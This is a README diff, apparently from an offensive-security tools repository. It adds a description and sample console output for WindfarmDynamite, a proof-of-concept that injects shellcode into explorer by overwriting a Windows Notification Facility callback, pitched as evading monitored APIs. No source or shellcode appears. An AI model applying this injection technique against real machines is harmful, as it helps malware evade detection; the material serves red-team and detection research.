@@ -137,6 +137,86 @@ C:\> DesertNut.exe -l
 [...Snipped...]
 ```
 
+### WindfarmDynamite
+
+WindfarmDynamite is a proof-of-concept for code injection using the Windows Notification Facility (WNF). Of interest here is that this avoids suspect thread orchestration APIs (like CreateRemoteThread). The POC overwrites a process level WNF subscription callback which can be triggered by signaling a WNF state name. There currently exists little functionality in Windows to monitor WNF activity. WindfarmDynamite includes two flags: "-l PID" to list all WNF subscriptions for a specific process and "-i" to inject shellcode into explorer and execute notepad. Note that this POC is only designed for x64 (tested on Win10). For further details please see [this talk](https://www.youtube.com/watch?v=MybmgE95weo) by Alex Ionescu & Gabrielle Viala and [this post](https://modexp.wordpress.com/2019/06/15/4083/) by modexp.
+
+```
+C:\> WindfarmDynamite.exe -i
+.  ..  ..___           .__                 ,
+|  ||\ |[__  _.._.._ _ |  \  .._  _.._ _ *-+- _
+|/\|| \||   (_][  [ | )|__/\_|[ )(_][ | )| | (/,
+                           ._|
+
+[+] Validating Process..
+[>] PID: 996, ImageName: explorer
+    |-> hProc: 632, Arch: x64
+
+[+] Leaking local WNF_SUBSCRIPTION_TABLE..
+[>] TblPtr: 0x7FFD99CB5FA8, NtdllRVA: 1335208
+
+[+] Remote WNF_SUBSCRIPTION_TABLE lookup..
+[>] rNtdllBase: 0x7FFD99B70000, rWNFSubTable: 0x5A9120
+    |-> NameTable Flink: 0x4A6CA10, NameTable Blink: 0x5BB050
+
+[+] Finding remote subscription -> WNF_SHEL_LOGON_COMPLETE
+[>] SubscriptionId: 0xB89, State Name: WNF_SHEL_LOGON_COMPLETE
+    |-> WNF_USER_SUBSCRIPTION: 0x49C8E38
+    |-> Callback: 0x7FFD82F58C60 => twinui.dll!DllCanUnloadNow
+    |-> Context: 0x2A12F40 => N/A
+
+[+] Allocating remote shellcode..
+[>] Sc Len: 344
+[>] Sc Address: 0x27A0000
+
+[+] Rewriting WNF subscription callback pointer..
+[+] NtUpdateWnfStateData -> Trigger shellcode
+[+] Restoring WNF subscription callback pointer & deallocating shellcode..
+
+C:\> WindfarmDynamite.exe -l 4132
+.  ..  ..___           .__                 ,
+|  ||\ |[__  _.._.._ _ |  \  .._  _.._ _ *-+- _
+|/\|| \||   (_][  [ | )|__/\_|[ )(_][ | )| | (/,
+                           ._|
+
+[+] Validating Process..
+[>] PID: 4132, ImageName: vmtoolsd
+    |-> hProc: 640, Arch: x64
+
+[+] Leaking local WNF_SUBSCRIPTION_TABLE..
+[>] TblPtr: 0x7FFD99CB5FA8, NtdllRVA: 1335208
+
+[+] Remote WNF_SUBSCRIPTION_TABLE lookup..
+[>] rNtdllBase: 0x7FFD99B70000, rWNFSubTable: 0x56B2F0
+    |-> NameTable Flink: 0x58EA30, NameTable Blink: 0x58F070
+
+[+] Reading remote WNF subscriptions..
+[>] SubscriptionId: 0x931, State Name: WNF_ENTR_EDPENFORCEMENTLEVEL_POLICY_VALUE_CHANGED
+    |-> WNF_USER_SUBSCRIPTION: 0x4BB5B88
+    |-> Callback: 0x7FFD87505DF0 => edputil.dll!EdpIsUIPolicyEvaluationEnabledForThread
+    |-> Context: 0x0 => N/A
+
+[>] SubscriptionId: 0x8FA, State Name: WNF_DX_MODE_CHANGE_NOTIFICATION
+    |-> WNF_USER_SUBSCRIPTION: 0x5B9658
+    |-> Callback: 0x7FFD96E5B230 => SHCore.dll!Ordinal126
+    |-> Context: 0xA1ECB0 => N/A
+
+[>] SubscriptionId: 0x8F9, State Name: WNF_DX_MONITOR_CHANGE_NOTIFICATION
+    |-> WNF_USER_SUBSCRIPTION: 0x5B9708
+    |-> Callback: 0x7FFD96E5B230 => SHCore.dll!Ordinal126
+    |-> Context: 0xA1ECB0 => N/A
+
+[>] SubscriptionId: 0x8F8, State Name: WNF_SPI_LOGICALDPIOVERRIDE
+    |-> WNF_USER_SUBSCRIPTION: 0x5BA368
+    |-> Callback: 0x7FFD96E5B230 => SHCore.dll!Ordinal126
+    |-> Context: 0xA1ECB0 => N/A
+
+[>] SubscriptionId: 0x8F4, State Name: WNF_RPCF_FWMAN_RUNNING
+    |-> WNF_USER_SUBSCRIPTION: 0x58F828
+    |-> Callback: 0x7FFD98610980 => rpcrt4.dll!NdrTypeSize
+    |-> Context: 0x0 => N/A
+```
+
 ## Windows API
 
 ### SystemProcessAndThreadsInformation
